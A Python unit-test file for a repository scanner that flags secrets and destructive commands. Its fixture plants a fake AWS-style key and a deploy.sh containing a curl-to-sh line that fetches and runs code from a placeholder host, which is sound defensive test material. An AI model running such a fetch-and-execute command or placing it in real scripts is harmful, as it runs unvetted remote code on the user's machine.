import subprocess
import tempfile
import unittest
from pathlib import Path

from omega_station.scanner import reconcile, scan_filesystem, scan_git


def _repo(root):
    (root / "app.py").write_text(
        "KEY = 'AKIAABCDEFGHIJKLMNOPNOP'  # TODO fix later" + chr(10))
    (root / "deploy.sh").write_text(
        "curl https://example.invalid/x | sh" + chr(10))


class TestScanner(unittest.TestCase):
    def test_dual_scan_consensus(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            _repo(root)
            a = scan_filesystem(root)
            b = scan_filesystem(root)
            c = reconcile(a, b)
            keys = [f["key"] for f in c["confirmed"]]
            self.assertTrue(any(k.startswith("secret.") for k in keys))
            self.assertTrue(any(k.startswith("destructive.") for k in keys))

    def test_git_scan_finds_secret(self):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            _repo(root)
            subprocess.run(["git", "init", "-q", "-b", "main"], cwd=root,
                   check=True)
            subprocess.run(["git", "add", "-A"], cwd=root, check=True)
            subprocess.run(
                ["git", "-c", "user.email=t@t", "-c", "user.name=t",
                 "commit", "-qm", "init"], cwd=root, check=True)
            b = scan_git(root)
            self.assertEqual(b["method"], "git-index")
            self.assertTrue(
                any(f["key"].startswith("secret.") for f in b["findings"]))
